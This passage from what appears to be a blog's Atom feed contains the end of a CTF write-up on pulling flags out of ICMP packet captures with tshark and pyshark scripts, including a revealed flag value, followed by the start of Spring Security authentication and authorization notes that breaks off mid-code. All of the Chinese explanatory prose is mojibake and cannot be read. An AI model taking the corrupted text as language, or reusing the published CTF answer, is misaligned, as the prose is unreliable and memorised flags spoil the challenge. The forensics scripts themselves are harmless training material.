ä¸ªæµï¼Œæˆ‘ä»¬ç›´æ¥æœå…³é”®è¯<code>ctfhub&#123;</code>æ‰¾ä¸åˆ°å°±æ¢ä¸‹ä¸ªæµï¼ŒèŠ‚çœå¾ˆå¤šæ—¶é—´ã€‚</li></ul><h4><span id="icmp-data">ICMP Data</span></h4><ul><li><p>æ–¹æ³•ä¸€ï¼šæ— æ³•è·Ÿè¸ªæµï¼Œç”¨â†“é€ä¸ªè§‚å¯Ÿï¼Œå‘ç°æœ‰ä¸ªä½ç½®æ¯æ¬¡å’Œä¸Šæ¬¡ä¸ä¸€æ ·ï¼Œæ‹¼èµ·æ¥å°±æ˜¯flagï¼Œæ¯æ¬¡éƒ½æœ‰ä¸¤ä¸ªåŒ…æ˜¯ä¸€æ ·çš„ä¸€ä¸ª<em>request</em>ä¸€ä¸ª<em>response</em>ï¼Œå› æ­¤ç­”æ¡ˆå°±æ˜¯<code>ctfhub&#123;c87eb99796406ac0b&#125;</code></p></li><li><p>æ–¹æ³•äºŒï¼šç¼–å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="comment"># --authorï¼švalecalida--</span></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system <span class="keyword">as</span> get_hex</span><br><span class="line"><span class="comment"># è°ƒç”¨tsharkæ—¶éœ€è¦å°†tsharkåŠ å…¥ç¯å¢ƒå˜é‡ï¼Œä¸”è„šæœ¬éœ€è¦ä¸æµé‡åŒ…åœ¨ä¸€ä¸ªè·¯å¾„ä¸‹</span></span><br><span class="line"> </span><br><span class="line">get_hex(<span class="string">&quot;tshark -r icmp_data.pcap -Y \&quot;icmp &amp;&amp; icmp.type==8\&quot; -T fields -e data &gt; flag.txt&quot;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(line[<span class="number">16</span>:<span class="number">18</span>], <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><ul><li>ä½¿ç”¨pysharkï¼Œå…¶ä¸­<strong>type&#x3D;8å³è¯·æ±‚ï¼Œtype&#x3D;0å³å“åº”</strong>ï¼Œè¿™é‡Œ0æˆ–è€…8éƒ½å¯ä»¥ï¼Œå› ä¸ºæ˜¯é‡å¤çš„ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="comment"># --author: valecalida--</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"> </span><br><span class="line">cap = pyshark.FileCapture(<span class="string">&quot;icmp_data.pcap&quot;</span>, display_filter=<span class="string">&quot;icmp &amp;&amp; icmp.type==8&quot;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">25</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(cap[i].icmp.data_data)[<span class="number">24</span>:<span class="number">26</span>], <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">cap.close()</span><br></pre></td></tr></table></figure></li></ul><p><strong>æ³¨æ„</strong>ï¼šåœ¨jupyteré‡Œé¢ä½¿ç”¨ä»£ç ä¼šå¯¼è‡´æŠ¥é”™<code>This event loop is already running</code>ã€‚</p><p><em>è§£å†³æ–¹æ¡ˆï¼š</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> nest_asyncio</span><br><span class="line">nest_asyncio.apply()</span><br></pre></td></tr></table></figure><h4><span id="icmp-length">ICMP Length</span></h4><ul><li><p>é¢˜ç›®æç¤ºï¼Œflagæš—è—ç„åªå› ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"></span><br><span class="line">cap = pyshark.FileCapture(<span class="string">&#x27;icmp_len.pcap&#x27;</span>,display_filter=<span class="string">&#x27;icmp &amp;&amp; icmp.type==8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">18</span>):</span><br><span class="line">    pkt = cap[i]</span><br><span class="line">    flag+=(<span class="built_in">chr</span>(<span class="built_in">int</span>(pkt.icmp.data_len)))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></li></ul><h4><span id="icmp-lengthbin">ICMP LengthBin</span></h4><ul><li><p>é¢˜ç›®å¾ˆç›´æ¥çš„ç»™äº†æç¤ºï¼Œå°±æ˜¯äºŒè¿›åˆ¶ä¸lengthçš„å…³ç³»ï¼Œä½¿ç”¨wiresharkæ‰“å¼€æµé‡åŒ…æŸ¥çœ‹ï¼Œä½¿ç”¨è¿‡æ»¤å™¨icmp&amp;&amp; icmp.type&#x3D;&#x3D;8æ¥è¿›è¡Œè¿‡æ»¤ï¼ŒæŸ¥çœ‹æ¯ä¸€æ¡æµé‡çš„lengthå€¼ï¼Œå‘ç°éƒ½æ˜¯32æˆ–64ï¼Œç›´æ¥ç¼–å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="comment"># --author: valecalida--</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"> </span><br><span class="line">cap = pyshark.FileCapture(<span class="string">&#x27;icmp_len_binary.pcap&#x27;</span>, display_filter=<span class="string">&quot;icmp &amp;&amp; icmp.type==8&quot;</span>)</span><br><span class="line">cap.load_packets()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">con1 = <span class="string">&quot;&quot;</span></span><br><span class="line">con2 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cap)):</span><br><span class="line">    <span class="keyword">if</span> cap[i].icmp.data_len == <span class="string">&#x27;32&#x27;</span>:</span><br><span class="line">        con1 += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        con2 += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> cap[i].icmp.data_len == <span class="string">&#x27;64&#x27;</span>:</span><br><span class="line">        con1 += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        con2 += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(binascii.a2b_hex(<span class="built_in">hex</span>(<span class="built_in">int</span>(con1, base=<span class="number">2</span>))[<span class="number">2</span>:]))</span><br><span class="line"><span class="built_in">print</span>(binascii.a2b_hex(<span class="built_in">hex</span>(<span class="built_in">int</span>(con2, base=<span class="number">2</span>))[<span class="number">2</span>:]))</span><br><span class="line">cap.close()</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ”¶é›†å’Œè®°å½•ä¸€ä¸‹CTFå…¥é—¨çš„write up&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://disda-coding.github.io/categories/ctf/"/>
    
    
    <category term="ctf" scheme="https://disda-coding.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Spring Security</title>
    <link href="https://disda-coding.github.io/2022/12/23/Spring%20Security/"/>
    <id>https://disda-coding.github.io/2022/12/23/Spring%20Security/</id>
    <published>2022-12-23T10:12:13.000Z</published>
    <updated>2023-03-29T01:03:19.461Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#%E5%9F%BA%E4%BA%8Ecookie%E4%B8%8Esession%E7%9A%84%E6%96%B9%E6%A1%88">åŸºäºCookieä¸Sessionçš„æ–¹æ¡ˆ</a></li><li><a href="#%E5%9F%BA%E4%BA%8Ejwt%E7%9A%84%E6%96%B9%E6%A1%88">åŸºäºjwtçš„æ–¹æ¡ˆ</a></li><li><a href="#%E5%9F%BA%E4%BA%8E%E8%87%AA%E5%AE%9A%E4%B9%89tokenredis">åŸºäºè‡ªå®šä¹‰Token+Redis</a></li><li><a href="#%E6%8A%80%E6%9C%AF%E8%B7%AF%E7%BA%BF">æŠ€æœ¯è·¯çº¿</a></li></ul><ul><li><a href="#%E9%89%B4%E6%9D%83">é‰´æƒ</a><ul><li><a href="#%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90">ç”¨æˆ·æƒé™</a></li><li><a href="#%E9%89%B4%E6%9D%83%E8%A7%84%E5%88%99%E6%BA%90">é‰´æƒè§„åˆ™æº</a></li><li><a href="#%E6%8E%88%E6%9D%83%E7%AE%A1%E7%90%86">æˆæƒç®¡ç†</a></li><li><a href="#%E6%8E%88%E6%9D%83%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E5%99%A8">æˆæƒé”™è¯¯å¤„ç†å™¨</a></li><li><a href="#%E9%85%8D%E7%BD%AE%E6%8E%88%E6%9D%83%E8%BF%87%E6%BB%A4%E5%99%A8">é…ç½®æˆæƒè¿‡æ»¤å™¨</a></li><li><a href="#%E9%85%8D%E7%BD%AEspring-security">é…ç½®Spring Security</a></li></ul></li></ul><!-- tocstop --><p><a href="https://tianjiashu.github.io/category/Spring/">è®¤è¯éƒ¨åˆ†å¯ä»¥çœ‹å…·ä½“ç¬”è®°</a></p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e97557e4960243a3942059939cdacacb~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp" alt="Spring Securityè¿‡æ»¤é“¾"></p><p><strong>å›¾ä¸­åªå±•ç¤ºäº†æ ¸å¿ƒè¿‡æ»¤å™¨</strong>ï¼Œå…¶å®ƒçš„éæ ¸å¿ƒè¿‡æ»¤å™¨å¹¶æ²¡æœ‰åœ¨å›¾ä¸­å±•ç¤ºã€‚</p><ul><li><code>UsernamePasswordAuthenticationFilter</code>:è´Ÿè´£å¤„ç†æˆ‘ä»¬åœ¨ç™»é™†é¡µé¢å¡«å†™äº†ç”¨æˆ·åå¯†ç åçš„ç™»é™†è¯·æ±‚ã€‚å…¥é—¨æ¡ˆä¾‹çš„è®¤è¯å·¥ä½œä¸»è¦æœ‰å®ƒè´Ÿè´£ã€‚ã€åˆ¤æ–­ä½ çš„ç”¨æˆ·åå’Œå¯†ç æ˜¯å¦æ­£ç¡®ã€‘</li><li><code>ExceptionTranslationFilter</code>ï¼šå¤„ç†è¿‡æ»¤å™¨é“¾ä¸­æŠ›å‡ºçš„ä»»ä½•<code>AccessDeniedException</code>å’Œ<code>AuthenticationException</code> ã€‚ã€å¤„ç†è®¤è¯æˆæƒè¿‡ç¨‹ä¸­çš„æ‰€æœ‰å¼‚å¸¸ï¼Œæ–¹ä¾¿ç»Ÿä¸€å¤„ç†ã€‘</li><li><code>FilterSecurityInterceptor</code>ï¼šè´Ÿè´£æƒé™æ ¡éªŒçš„è¿‡æ»¤å™¨ã€‚ã€å®ƒä¼šåˆ¤æ–­ä½ ç™»å½•æˆåŠŸçš„ç”¨æˆ·æ˜¯â€œè°â€ï¼Œâ€œä½ â€å…·æœ‰ä»€ä¹ˆæƒé™ï¼Œå½“å‰è®¿é—®çš„èµ„æºéœ€è¦ä»€ä¹ˆæƒé™ã€‘</li></ul><p>è¿‡ç¨‹è¯¦è§£ï¼š</p><p>å½“å‰ç«¯æäº¤ç”¨æˆ·åå’Œå¯†ç è¿‡æ¥æ—¶ï¼Œè¿›å…¥äº†<code>UsernamePasswordAuthenticationFilter</code>è¿‡æ»¤å™¨ã€‚</p><ul><li><p>åœ¨<code>UsernamePasswordAuthenticationFilter</code>è¿‡æ»¤å™¨é‡Œï¼Œå°†ä¼ è¿›æ¥çš„ç”¨æˆ·åå’Œå¯†ç è¢«å°è£…æˆäº†**<code>Authentication</code><strong>å¯¹è±¡ã€è¿™æ—¶å€™æœ€å¤šåªæœ‰ç”¨æˆ·åå’Œå¯†ç ï¼Œæƒé™è¿˜æ²¡æœ‰ã€‘ï¼Œ</strong><code>Authentication</code><strong>å¯¹è±¡é€šè¿‡</strong><code>ProviderManager</code>çš„<code>authenticate</code>æ–¹æ³•**è¿›è¡Œè®¤è¯ã€‚</p><ul><li><p>åœ¨**<code>ProviderManager</code>**é‡Œé¢ï¼Œé€šè¿‡è°ƒç”¨<code>DaoAuthenticationProvider</code>çš„<code>authenticate</code>æ–¹æ³•è¿›è¡Œè®¤è¯ã€‚</p><ul><li><p>åœ¨<code>DaoAuthenticationProvider</code>é‡Œï¼Œè°ƒç”¨**<code>InMemoryUserDetailsManager</code>çš„<code>loadUserByUsername</code>æ–¹æ³•<strong>æŸ¥è¯¢ç”¨æˆ·ã€‚ã€ä¼ å…¥çš„å‚æ•°åªæœ‰</strong>ç”¨æˆ·åå­—ç¬¦ä¸²**ã€‘</p><ul><li><p>åœ¨</p><p><strong><code>InMemoryUserDetailsManager</code>çš„<code>loadUserByUsername</code>æ–¹æ³•</strong></p><p>é‡Œæ‰§è¡Œäº†ä»¥ä¸‹æ“ä½œ</p><ol><li>æ ¹æ®ç”¨æˆ·åæŸ¥è¯¢å¯¹äºç”¨æˆ·ä»¥åŠè¿™ä¸ªç”¨æˆ·çš„æƒé™ä¿¡æ¯ã€<strong>åœ¨å†…å­˜é‡ŒæŸ¥</strong>ã€‘</li><li>æŠŠå¯¹åº”çš„ç”¨æˆ·ä¿¡æ¯åŒ…æ‹¬æƒé™ä¿¡æ¯å°è£…æˆ**<code>UserDetails</code>å¯¹è±¡**ã€‚</li><li>è¿”å›**<code>UserDetails</code>å¯¹è±¡**ã€‚</li></ol></li></ul></li><li><p>è¿”å›ç»™äº†<code>DaoAuthenticationProvider</code>ï¼Œåœ¨è¿™ä¸ªå¯¹è±¡é‡Œæ‰§è¡Œäº†ä»¥ä¸‹æ“ä½œ</p><ol><li>é€šè¿‡**<code>PasswordEncoder</code><strong>å¯¹æ¯”</strong><code>UserDetails</code><strong>ä¸­çš„å¯†ç å’Œ</strong><code>Authentication</code><strong>å¯†ç æ˜¯å¦æ­£ç¡®ã€‚ã€</strong>æ ¡éªŒå¯†ç ï¼ˆç»è¿‡åŠ å¯†çš„ï¼‰**ã€‘</li><li>å¦‚æœæ­£ç¡®å°±æŠŠ**<code>UserDetails</code><strong>çš„</strong>æƒé™ä¿¡æ¯<strong>è®¾ç½®åˆ°</strong><code>Authentication</code>**å¯¹è±¡ä¸­ã€‚</li><li>è¿”å›**<code>Authentication</code>**å¯¹è±¡ã€‚</li></ol></li></ul></li></ul></li><li><p>åˆå›åˆ°äº†è¿‡æ»¤å™¨é‡Œé¢<code>UsernamePasswordAuthenticationFilter</code>ã€‚</p><ol><li><p>å¦‚æœä¸Šä¸€æ­¥è¿”å›äº†**<code>Authentication</code>**å¯¹è±¡</p><p>å°±ä½¿ç”¨**<code>SecurityContextHolder.getContext().setAuthentication()</code>**æ–¹æ³•å­˜å‚¨å¯¹è±¡ã€‚</p><p><strong>å…¶ä»–è¿‡æ»¤å™¨</strong>ä¼šé€šè¿‡<code>SecurityContextHolder</code>æ¥è·å–å½“å‰ç”¨æˆ·ä¿¡æ¯ã€‚ã€å½“å‰è¿‡æ»¤å™¨è®¤è¯å®Œäº†ï¼Œåé¢çš„è¿‡æ»¤å™¨è¿˜éœ€è¦è·å–ç”¨æˆ·ä¿¡æ¯ï¼Œæ¯”å¦‚æˆæƒè¿‡æ»¤å™¨ã€‘</p></li></ol></li></ul><blockquote><p>å½©è‰²å­—ä½“çš„ç±»å‡æ˜¯æ¯”è¾ƒé‡è¦çš„<strong>æ¥å£</strong>ï¼Œåœ¨å®ç°è®¤è¯çš„è¿‡ç¨‹ä¸­å‡éœ€è¦è‡ªå®šä¹‰ä¸€ä¸ªç±»æ¥é‡æ–°å®ç°æˆ–è€…å˜æ›´ä¸ºSpringä¸­å…¶ä»–å®ç°ç±»ã€‚</p></blockquote><p>æ¦‚å¿µé€ŸæŸ¥ï¼š</p><ul><li><strong><code>Authentication</code><strong>æ¥å£: å®ƒçš„å®ç°ç±»ï¼Œè¡¨ç¤ºå½“å‰è®¿é—®ç³»ç»Ÿçš„ç”¨æˆ·ï¼Œ</strong>å°è£…äº†ç”¨æˆ·çš„æƒé™ç­‰ç›¸å…³ä¿¡æ¯ã€‚</strong></li><li><strong><code>AuthenticationManager</code><strong>æ¥å£ï¼šå®šä¹‰äº†è®¤è¯Authenticationçš„æ–¹æ³• ,å®ç°ç±»æ˜¯</strong><code>ProviderManager</code></strong><ul><li>å®ƒçš„å®ç°ç±»æ˜¯**<code>ProviderManager</code><strong>ï¼Œå®ƒçš„åŠŸèƒ½ä¸»è¦æ˜¯å®ç°</strong>è®¤è¯ç”¨æˆ·<strong>ï¼Œå› ä¸ºåœ¨å†™ç™»å½•æ¥å£æ—¶ï¼Œå¯ä»¥é€šè¿‡é…ç½®ç±»çš„æ–¹å¼ï¼Œæ³¨å…¥Springå®¹å™¨ä¸­æ¥ä½¿ç”¨å®ƒçš„</strong><code>authenticate</code>æ–¹æ³•**ã€‚</li></ul></li><li><strong><code>UserDetailsService</code><strong>æ¥å£ï¼šåŠ è½½ç”¨æˆ·ç‰¹å®šæ•°æ®çš„æ ¸å¿ƒæ¥å£ã€‚é‡Œé¢å®šä¹‰äº†ä¸€ä¸ª</strong>æ ¹æ®ç”¨æˆ·åæŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯çš„æ–¹æ³•</strong>ã€‚<ul><li>åŸæœ¬çš„å®ç°ç±»æ˜¯**<code>InMemoryUserDetailsManager</code>**ï¼Œå®ƒæ˜¯åœ¨å†…å­˜ä¸­æŸ¥è¯¢ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦è‡ªå®šä¹‰æ”¹æ¥å£ã€‚</li></ul></li><li>**<code>UserDetails</code><strong>æ¥å£ï¼šæä¾›æ ¸å¿ƒç”¨æˆ·ä¿¡æ¯ã€‚é€šè¿‡</strong><code>UserDetailsService</code><strong>æ ¹æ®ç”¨æˆ·åè·å–å¤„ç†çš„ç”¨æˆ·ä¿¡æ¯è¦å°è£…æˆ</strong><code>UserDetails</code><strong>å¯¹è±¡è¿”å›ã€‚ç„¶åå°†è¿™äº›ä¿¡æ¯å°è£…åˆ°</strong><code>Authentication</code>**å¯¹è±¡ä¸­ã€‚<ul><li>å½“æˆ‘ä»¬è‡ªå®šä¹‰**<code>UserDetailsService</code><strong>æ¥å£æ—¶ï¼Œéœ€è¦æˆ‘ä»¬å®šä¹‰ä¸€ä¸ª</strong>å®ä½“ç±»<strong>æ¥å®ç°è¿™ä¸ªæ¥å£æ¥ä¾›</strong><code>UserDetailsService</code>**æ¥å£è¿”å›ã€‚ã€æ³¨æ„æ˜¯å®ä½“ç±»ã€‘</li></ul></li></ul><h3><span id="åŸºäºcookieä¸sessionçš„æ–¹æ¡ˆ">åŸºäºCookieä¸Sessionçš„æ–¹æ¡ˆ</span></h3><ul><li>ä¼˜ç‚¹ï¼šå®ç°ç®€å•ï¼Œæˆç†Ÿ</li><li>ç¼ºç‚¹ï¼šé›†ç¾¤æƒ…å†µä¸‹å®ç°å›°éš¾ï¼Œåå‘ä»£ç†é…ç½®ç¹çï¼Œç§»åŠ¨ç«¯ä¸å‹å¥½</li></ul><h3><span id="åŸºäºjwtçš„æ–¹æ¡ˆ">åŸºäºjwtçš„æ–¹æ¡ˆ</span></h3><ul><li>ä¼˜ç‚¹ï¼šæ— çŠ¶æ€ï¼ŒæœåŠ¡å™¨èµ„æºå ç”¨å°ï¼Œå¤©ç”Ÿæ”¯æŒåˆ†å¸ƒå¼ï¼Œå®ç°ç®€å•</li><li>ç¼ºç‚¹ï¼šå®‰å…¨æ€§ä¸é«˜ï¼Œjwtæ²¡åŠæ³•å®ç°è¿‡æœŸå°†ç”¨æˆ·è¸¢ä¸‹çº¿ï¼Œåªèƒ½å‰ç«¯å®ç°ï¼Œä½†æ˜¯jwtåœ¨æœ‰æ•ˆæœŸå†…ä¾ç„¶æœ‰æ•ˆã€‚</li></ul><h3><span id="åŸºäºè‡ªå®šä¹‰tokenredis">åŸºäºè‡ªå®šä¹‰Token+Redis</span></h3><ul><li>ä¼˜ç‚¹ï¼šæœåŠ¡å™¨å¯ä»¥å®ç°å¯¹ç”¨æˆ·çš„ä¸‹çº¿ç­‰æ“ä½œï¼Œæ”¯æŒåˆ†å¸ƒå¼</li><li>ç¼ºç‚¹ï¼šç›¸æ¯”jwtæ˜¯ä¸­å¿ƒåŒ–æ–¹æ¡ˆï¼Œå¯¹æœåŠ¡å™¨å­˜å‚¨æœ‰è¦æ±‚ï¼Œåˆ†å¸ƒå¼éœ€è¦ç”¨åˆ°Redis</li></ul><h3><span id="æŠ€æœ¯è·¯çº¿">æŠ€æœ¯è·¯çº¿</span></h3><ul><li>å¯ä»¥ä½¿ç”¨controllerï¼Œç„¶åä¸ä½¿ç”¨formloginå°±ä¸ä¼šæ³¨å…¥UserPasswordAuthenticationFilterï¼ˆæ¯”è¾ƒçµæ´»ï¼Œå®ç°æ‹“å±•åŠŸèƒ½æ¯”è¾ƒç®€å•ï¼‰</li><li>ä¹Ÿå¯ä»¥é‡å†™UserPasswordAuthenticationFilterï¼Œç„¶åé‡å†™å®ƒçš„è®¤è¯æˆåŠŸï¼Œå¤±è´¥æ¥å£</li></ul><h2><span id="é‰´æƒ">é‰´æƒ</span></h2><p>é‰´æƒå‘ç”Ÿåœ¨è®¤è¯ä¹‹åï¼Œå› æ­¤é‰´æƒå…¥å£åœ¨<strong>FilterSecurityInterceptor</strong>ä¸­ï¼Œ<a href="https://juejin.cn/post/6847902222668431368">åŸç†</a>ä¸å¤šèµ˜è¿°ï¼Œæœ‰ä¸‰ç§å®ç°æ–¹æ³•ã€‚</p><ol><li>ç›´æ¥é‡å†™ä¸€ä¸ª<code>AccessDecisionManager</code>ï¼Œå°†å®ƒç”¨ä½œé»˜è®¤çš„<code>AccessDecisionManager</code>ï¼Œå¹¶åœ¨é‡Œé¢ç›´æ¥å†™å¥½é‰´æƒé€»è¾‘ã€‚</li><li>å†æ¯”å¦‚é‡å†™ä¸€ä¸ªæŠ•ç¥¨å™¨ï¼Œå°†å®ƒæ”¾åˆ°é»˜è®¤çš„<code>AccessDecisionManager</code>é‡Œé¢ï¼Œå’Œä¹‹å‰ä¸€æ ·ç”¨æŠ•ç¥¨å™¨é‰´æƒã€‚</li><li>æˆ‘çœ‹ç½‘ä¸Šè¿˜æœ‰äº›åšå®¢ç›´æ¥å»åš<code>FilterSecurityInterceptor</code>çš„æ”¹åŠ¨ã€‚</li></ol><h3><span id="ç”¨æˆ·æƒé™">ç”¨æˆ·æƒé™</span></h3><blockquote><p>UserUserDetails ç”¨æˆ·æƒé™</p><p>GrantedAuthority ä¸€èˆ¬ä½¿ç”¨å®ç°ç±»SimpleGrantedAuthorityå°±å¤Ÿäº†</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å½“æ›´æ–°Adminæ—¶ï¼Œä¼ å…¥çš„authoritiesæ˜¯JSONæ ¼å¼ï¼Œè€ŒgetAuthorities()</span></span><br><span class="line"><span class="comment"> * éœ€è¦Collection&lt;? extends GrantedAuthority&gt; æ ¼å¼</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * è‡ªå®šä¹‰JSONååºåˆ—åŒ–</span></span><br><span class="line"><span class="comment"> * CustomAuthorityDeserializer</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@JsonDeserialize(using = CustomAuthorityDeserializer.class)</span></span><br><span class="line"><span class="keyword">public</span> Collection&lt;? <span class="keyword">extends</span> <span class="title class_">GrantedAuthority</span>&gt; getAuthorities() &#123;</span><br><span class="line">    List&lt;SimpleGrantedAuthority&gt; authorities = roles</span><br><span class="line">            .stream()</span><br><span class="line">            .map(role -&gt; <span class="keyword">new</span> <span class="title class_">SimpleGrantedAuthority</span>(role.getName()))</span><br><span class="line">            .collect(Collectors.toList());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> authorities;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="é‰´æƒè§„åˆ™æº">é‰´æƒè§„åˆ™æº</span></h3><blockquote><p>FilterInvocationSecurityMetadataSource é‰´æƒè§„åˆ™æº</p><p>ç”¨äºè¿”å›å½“å‰APIæ‰€éœ€çš„ROLE</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * èœå•æƒé™æ§åˆ¶</span></span><br><span class="line"><span class="comment"> * æ ¹æ®è¯·æ±‚urlåˆ†æè¯·æ±‚æ‰€éœ€çš„è§’è‰²</span></span><br><span class="line"><span class="comment"> * è®¿é—®è¯¥urlèµ„æºæ‰€éœ€è§’è‰²</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomFilter</span> <span class="keyword">implements</span> <span class="title class_">FilterInvocationSecurityMetadataSource</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> IMenuService menuService;</span><br><span class="line"></span><br><span class="line">    <span class="type">AntPathMatcher</span> <span class="variable">antPathMatcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AntPathMatcher</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ ¹æ®requestè¯·æ±‚è·å–è®¿é—®èµ„æºæ‰€éœ€æƒé™</span></span><br><span class="line"><span class="comment">     * ç”¨æˆ·GrantedAuthorityä¸ConfigAttributeä¸€å¯¹æ¯”å°±çŸ¥é“ç”¨æˆ·æœ‰æ²¡æœ‰æƒé™è®¿é—®è¯¥apiäº†</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> o</span></span><br><span class="line"><span class="comment">     * <span 